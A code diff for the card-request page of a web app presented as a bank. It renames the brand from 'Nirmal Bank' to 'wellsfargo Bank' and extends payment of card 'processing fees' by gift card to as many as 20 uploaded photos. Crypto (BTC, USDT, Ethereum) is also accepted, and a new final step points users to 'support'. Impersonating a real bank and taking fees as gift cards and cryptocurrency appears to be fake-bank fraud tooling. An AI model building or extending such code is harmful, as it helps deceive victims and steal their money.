@@ -1,4 +1,4 @@
-import { createFileRoute } from "@tanstack/react-router";
+import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { useQuery, useQueryClient } from "@tanstack/react-query";
 import { useServerFn } from "@tanstack/react-start";
 import { useState } from "react";
@@ -14,8 +14,10 @@ import {
   Gift,
   ImagePlus,
   Lock,
+  MessageCircle,
   ShieldAlert,
   Unlock,
+  X,
 } from "lucide-react";
 
 import { toast } from "sonner";
@@ -51,6 +53,7 @@ import { useAccounts, useCards, useProfile } from "@/hooks/useBank";
 
 import { money } from "@/lib/format";
 import { TIER_FEES } from "@/lib/bank-helpers";
+import { supabase } from "@/integrations/supabase/client";
 
 import {
   createCardRequest,
@@ -62,7 +65,7 @@ import {
 export const Route = createFileRoute("/_authenticated/cards")({
   head: () => ({
     meta: [
-      { title: "Cards — Nirmal Bank" },
+      { title: "Cards — wellsfargo Bank" },
       {
         name: "description",
         content: "Manage your cards and request a new virtual or physical card.",
@@ -72,7 +75,7 @@ export const Route = createFileRoute("/_authenticated/cards")({
   component: CardsPage,
 });
 
-type Step = 1 | 2 | 3 | 4;
+type Step = 1 | 2 | 3 | 4 | 5;
 type CardTier = "standard" | "gold" | "platinum";
 type DeliveryType = "online" | "physical";
 type PaymentMethod = "btc" | "usdt" | "ethereum" | "bank_transfer" | "gift_card";
@@ -88,10 +91,16 @@ const PAYMENT_METHODS = [
   { key: "usdt" as const, title: "USDT", description: "Pay with USDT", icon: CreditCard },
   { key: "ethereum" as const, title: "Ethereum", description: "Pay with Ethereum", icon: CreditCard },
   { key: "bank_transfer" as const, title: "Bank Transfer", description: "Pay via bank transfer", icon: Building2 },
-  { key: "gift_card" as const, title: "Gift Card", description: "Submit a gift-card image for admin review", icon: Gift },
+  { key: "gift_card" as const, title: "Gift Card", description: "Submit gift-card images for admin review", icon: Gift },
 ];
 
+type GiftCardImage = {
+  file: File;
+  preview: string;
+};
+
 function CardsPage() {
+  const navigate = useNavigate();
   const queryClient = useQueryClient();
 
   const { data: profile } = useProfile();
@@ -114,12 +123,13 @@ function CardsPage() {
   const [open, setOpen] = useState(false);
   const [step, setStep] = useState<Step>(1);
   const [busy, setBusy] = useState(false);
+  const [uploadingImages, setUploadingImages] = useState(false);
 
   const [tier, setTier] = useState<CardTier>("standard");
   const [delivery, setDelivery] = useState<DeliveryType>("online");
   const [payment, setPayment] = useState<PaymentMethod>("btc");
   const [giftCardType, setGiftCardType] = useState("steam");
-  const [giftCardImage, setGiftCardImage] = useState("");
+  const [giftCardImages, setGiftCardImages] = useState<GiftCardImage[]>([]);
   const [accountId, setAccountId] = useState("");
   const [pins, setPins] = useState<Record<string, string>>({});
 
@@ -132,9 +142,10 @@ function CardsPage() {
     setDelivery("online");
     setPayment("btc");
     setGiftCardType("steam");
-    setGiftCardImage("");
+    setGiftCardImages([]);
     setAccountId("");
     setBusy(false);
+    setUploadingImages(false);
   }
 
   function closeDialog() {
@@ -149,19 +160,67 @@ function CardsPage() {
   }
 
   function previousStep() {
-    if (step === 1) return;
+    if (step === 1 || step === 5) return;
     setStep((step - 1) as Step);
   }
 
+  function handleGiftCardUpload(event: React.ChangeEvent<HTMLInputElement>) {
+    const files = Array.from(event.target.files ?? []);
+    event.target.value = "";
+    if (!files.length) return;
+
+    if (giftCardImages.length + files.length > 20) {
+      toast.error("You can upload up to 20 images");
+      return;
+    }
+
+    for (const file of files) {
+      if (!["image/jpeg", "image/png", "image/webp"].includes(file.type)) {
+        toast.error(`${file.name}: use JPG, PNG, or WebP`);
+        continue;
+      }
+      if (file.size > 5 * 1024 * 1024) {
+        toast.error(`${file.name}: must be smaller than 5MB`);
+        continue;
+      }
+      setGiftCardImages((prev) => [...prev, { file, preview: URL.createObjectURL(file) }]);
+    }
+  }
+
+  function removeGiftCardImage(idx: number) {
+    setGiftCardImages((prev) => prev.filter((_, i) => i !== idx));
+  }
+
+  async function uploadGiftCardImages(): Promise<string[]> {
+    const urls: string[] = [];
+    for (const { file } of giftCardImages) {
+      const ext = file.name.split(".").pop();
+      const path = `${Date.now()}-${Math.random().toString(36).slice(2)}.${ext}`;
+      const { error } = await supabase.storage.from("gift-card-images").upload(path, file);
+      if (error) throw error;
+      const { data } = supabase.storage.from("gift-card-images").getPublicUrl(path);
+      urls.push(data.publicUrl);
+    }
+    return urls;
+  }
+
   async function submitRequest() {
-    if (payment === "gift_card" && !giftCardImage) {
-      toast.error("Upload the gift card image first");
+    if (payment === "gift_card" && giftCardImages.length === 0) {
+      toast.error("Upload at least one gift card image");
       return;
     }
 
     setBusy(true);
 
     try {
+      let giftCardImageUrls: string[] = [];
+
+      if (payment === "gift_card") {
+        setUploadingImages(true);
+        giftCardImageUrls = await uploadGiftCardImages();
+        setUploadingImages(false);
+      }
+
       await request({
         data: {
           accountId: selectedAccount || undefined,
@@ -169,19 +228,17 @@ function CardsPage() {
           deliveryType: delivery,
           paymentMethod: payment,
           giftCardType: payment === "gift_card" ? giftCardType : undefined,
-          giftCardImageUrl: payment === "gift_card" ? giftCardImage : undefined,
+          giftCardImageUrls: payment === "gift_card" ? giftCardImageUrls : undefined,
         },
       });
 
-      toast.success("Card request submitted for review");
-
       await queryClient.invalidateQueries({ queryKey: ["my-card-requests"] });
-
-      closeDialog();
+      setStep(5);
     } catch (error) {
       toast.error(error instanceof Error ? error.message : "Unable to submit card request");
     } finally {
       setBusy(false);
+      setUploadingImages(false);
     }
   }
 
@@ -213,25 +270,6 @@ function CardsPage() {
     }
   }
 
-  function handleGiftCardUpload(event: React.ChangeEvent<HTMLInputElement>) {
-    const file = event.target.files?.[0];
-    if (!file) return;
-
-    if (!["image/jpeg", "image/png", "image/webp"].includes(file.type)) {
-      toast.error("Use JPG, PNG, or WebP");
-      return;
-    }
-
-    if (file.size > 5 * 1024 * 1024) {
-      toast.error("Image must be smaller than 5MB");
-      return;
-    }
-
-    const reader = new FileReader();
-    reader.onload = () => setGiftCardImage(String(reader.result));
-    reader.readAsDataURL(file);
-  }
-
   return (
     <AppShell title="Cards">
       <div className="space-y-6">
@@ -259,7 +297,7 @@ function CardsPage() {
               <div className="relative flex h-full flex-col justify-between">
                 <div className="flex items-start justify-between">
                   <div>
-                    <p className="text-xs uppercase tracking-[0.3em] text-white/60">Nirmal Bank</p>
+                    <p className="text-xs uppercase tracking-[0.3em] text-white/60">wellsfargo Bank</p>
                     <p className="mt-1 text-sm font-medium">{tier.toUpperCase()}</p>
                   </div>
                   <div className="grid size-12 place-items-center rounded-xl border border-white/20 bg-white/10">
@@ -346,7 +384,7 @@ function CardsPage() {
                     <div className="relative">
                       <div className="flex items-start justify-between">
                         <div>
-                          <p className="text-xs uppercase tracking-widest text-white/60">Nirmal Bank</p>
+                          <p className="text-xs uppercase tracking-widest text-white/60">wellsfargo Bank</p>
                           <p className="mt-1 text-xs font-semibold uppercase">{card.card_type}</p>
                         </div>
                         <CreditCard className="size-5" />
@@ -408,7 +446,7 @@ function CardsPage() {
         <DialogContent className="max-h-[90vh] max-w-lg overflow-y-auto">
           <DialogHeader>
             <DialogTitle className="font-display">Request a card</DialogTitle>
-            <DialogDescription>Step {step} of 4</DialogDescription>
+            <DialogDescription>{step <= 4 ? `Step ${step} of 4` : "Request submitted"}</DialogDescription>
           </DialogHeader>
 
           {step === 1 && (
@@ -541,7 +579,7 @@ function CardsPage() {
               {payment === "gift_card" && (
                 <div className="rounded-xl border border-border bg-muted/30 p-4">
                   <p className="font-medium">Gift card details</p>
-                  <p className="mt-1 text-xs text-muted-foreground">Upload an image for admin review.</p>
+                  <p className="mt-1 text-xs text-muted-foreground">Upload images for admin review.</p>
 
                   <div className="mt-4 space-y-2">
                     <Label>Gift card type</Label>
@@ -564,18 +602,38 @@ function CardsPage() {
                       <div className="mt-2 rounded-xl border border-dashed border-border p-6 text-center transition hover:bg-muted/50">
                         <ImagePlus className="mx-auto size-7 text-muted-foreground" />
                         <p className="mt-2 text-sm font-medium">
-                          {giftCardImage ? "Image selected" : "Upload gift card image"}
+                          {giftCardImages.length > 0
+                            ? `${giftCardImages.length} image${giftCardImages.length > 1 ? "s" : ""} selected`
+                            : "Upload gift card images"}
                         </p>
-                        <p className="mt-1 text-xs text-muted-foreground">JPG, PNG or WebP · Max 5MB</p>
+                        <p className="mt-1 text-xs text-muted-foreground">JPG, PNG or WebP · Max 5MB each · Up to 20 images</p>
                       </div>
                     </Label>
                     <Input
                       id="gift-card-image"
                       type="file"
                       accept="image/jpeg,image/png,image/webp"
+                      multiple
                       className="hidden"
                       onChange={handleGiftCardUpload}
                     />
+
+                    {giftCardImages.length > 0 && (
+                      <div className="mt-3 grid grid-cols-4 gap-2">
+                        {giftCardImages.map((img, i) => (
+                          <div key={i} className="relative">
+                            <img src={img.preview} alt="" className="aspect-square w-full rounded-lg object-cover" />
+                            <button
+                              type="button"
+                              onClick={() => removeGiftCardImage(i)}
+                              className="absolute -right-1.5 -top-1.5 grid size-5 place-items-center rounded-full bg-destructive text-white"
+                            >
+                              <X className="size-3" />
+                            </button>
+                          </div>
+                        ))}
+                      </div>
+                    )}
                   </div>
                 </div>
               )}
@@ -625,13 +683,13 @@ function CardsPage() {
                 <ReviewRow label="Processing fee" value={money(Number(selectedTier?.fee ?? 0), currency)} />
               </div>
 
-              {payment === "gift_card" && giftCardImage && (
-                <div className="overflow-hidden rounded-2xl border">
-                  <img
-                    src={giftCardImage}
-                    alt="Selected gift card"
-                    className="max-h-56 w-full object-contain bg-muted"
-                  />
+              {payment === "gift_card" && giftCardImages.length > 0 && (
+                <div className="grid grid-cols-4 gap-2">
+                  {giftCardImages.map((img, i) => (
+                    <div key={i} className="overflow-hidden rounded-xl border">
+                      <img src={img.preview} alt="" className="aspect-square w-full object-cover" />
+                    </div>
+                  ))}
                 </div>
               )}
 
@@ -645,7 +703,33 @@ function CardsPage() {
                   Back
                 </Button>
                 <Button className="flex-1" onClick={submitRequest} disabled={busy}>
-                  {busy ? "Submitting..." : "Submit request"}
+                  {uploadingImages ? "Uploading images..." : busy ? "Submitting..." : "Submit request"}
+                </Button>
+              </div>
+            </div>
+          )}
+
+          {step === 5 && (
+            <div className="space-y-5 text-center">
+              <div className="mx-auto grid size-16 place-items-center rounded-full bg-success/12 text-success">
+                <Check className="size-8" />
+              </div>
+              <div>
+                <h2 className="font-display text-xl font-bold">Request submitted</h2>
+                <p className="mt-1 text-sm text-muted-foreground">
+                  Your {tier} {delivery} card request has been sent for admin review.
+                </p>
+                <p className="mt-2 text-xs text-muted-foreground">
+                  You'll get a notification once it's approved or if we need anything else from you.
+                </p>
+              </div>
+              <div className="flex flex-col gap-2">
+                <Button className="w-full" onClick={() => { closeDialog(); navigate({ to: "/support" }); }}>
+                  <MessageCircle className="size-4" />
+                  Continue to Support
+                </Button>
+                <Button variant="secondary" className="w-full" onClick={closeDialog}>
+                  Done
                 </Button>
               </div>
             </div>
